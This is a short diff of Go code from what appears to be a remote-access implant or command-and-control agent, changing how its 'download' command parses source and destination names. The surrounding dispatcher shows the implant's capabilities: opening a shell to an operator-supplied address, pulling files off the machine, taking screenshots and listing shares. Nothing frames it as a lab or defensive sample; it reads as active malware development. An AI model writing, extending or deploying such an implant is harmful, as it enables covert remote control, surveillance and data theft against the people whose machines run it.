@@ -106,12 +106,20 @@ func executeCommandAndSendResult(cmd Command) {
         address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
         Shell(address)
     case strings.HasPrefix(cmd.Cmd, "download "):
-        parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
-        if len(parts) == 2 {
-            downloadFile(parts[0], parts[1], cmd.ID)
-        } else {
-            log.Println("Download command format error. Expected 'download <path> <filename>'.")
+        tokens := strings.Split(cmd.Cmd, " ")
+        if len(tokens) < 3 {
+                sendResult(CommandResult{ID: cmd.ID, Result: "[-] Usage: download <source_path> <destination_name>"})
+                return
         }
+
+        // Recombine everything except the last token
+        srcPath := strings.Join(tokens[1:len(tokens)-1], " ")
+        dstName := tokens[len(tokens)-1]
+
+        srcPath = strings.Trim(srcPath, "\"'")
+        dstName = strings.Trim(dstName, "\"'")
+
+        downloadFile(srcPath, dstName, cmd.ID)
     case cmd.Cmd == "screenshot":
         takeScreenshot(cmd)
     case cmd.Cmd == "list_share":
